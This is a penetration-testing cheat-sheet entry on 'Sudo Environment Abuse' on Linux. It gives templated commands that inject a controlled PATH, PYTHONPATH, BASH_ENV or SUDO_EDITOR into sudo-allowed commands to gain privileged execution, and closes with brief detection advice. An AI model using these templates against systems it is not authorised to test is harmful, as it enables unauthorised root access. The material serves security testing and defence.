---
technique: Sudo Environment Abuse
category: privilege-escalation
targets: Linux sudoers
protocols: Local
remote_capable: false
tags: linux privilege-escalation sudo environment path pythonpath bash-env
---

# Sudo Environment Abuse

Sudo environment abuse targets preserved variables such as `PATH`, `PYTHONPATH`, `BASH_ENV`, and editor variables that influence privileged command execution.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Sudo rule | Current user must have a useful sudo rule |
| Preserved variable | sudoers must preserve or accept the target environment variable |
| Matching interpreter | The allowed command must invoke the affected shell, interpreter, or editor |

## Linux

### Sudo version

#sh #sudo #recon

Print sudo version and build options.

```sh title:"Print sudo version"
sudo -V
```
<!-- cheat -->

### Sudo rights

#sh #sudo #recon

List allowed sudo commands and environment policy.

```sh title:"List sudo rights and environment policy"
sudo -l
```
<!-- cheat -->

### Preserve PATH

#sh #sudo #path

Run a sudo-allowed command with a controlled PATH when policy permits it.

```sh title:"Run sudo command with controlled PATH"
PATH="$writable_dir:$PATH" sudo "$allowed_command"
```
<!-- cheat
var writable_dir
var allowed_command
-->

### Preserve PYTHONPATH

#sh #sudo #python

Run a sudo-allowed Python command with a controlled import path.

```sh title:"Run sudo command with PYTHONPATH"
PYTHONPATH="$python_path" sudo "$allowed_command"
```
<!-- cheat
var python_path
var allowed_command
-->

### Preserve BASH_ENV

#sh #sudo #bash

Run a sudo-allowed Bash path with a controlled non-interactive startup file.

```sh title:"Run sudo command with BASH_ENV"
BASH_ENV="$script_path" sudo "$allowed_command"
```
<!-- cheat
var script_path
var allowed_command
-->

### sudoedit editor variable

#sh #sudoedit #editor

Run sudoedit with a controlled editor command when the target version and policy are vulnerable.

```sh title:"Run sudoedit with controlled editor"
SUDO_EDITOR="$editor_command" sudoedit "$target_file"
```
<!-- cheat
var editor_command
var target_file
-->

## Detection

Monitor sudo executions with preserved environment variables, unusual editor values, and sudo rules that allow shell or interpreter wrappers.
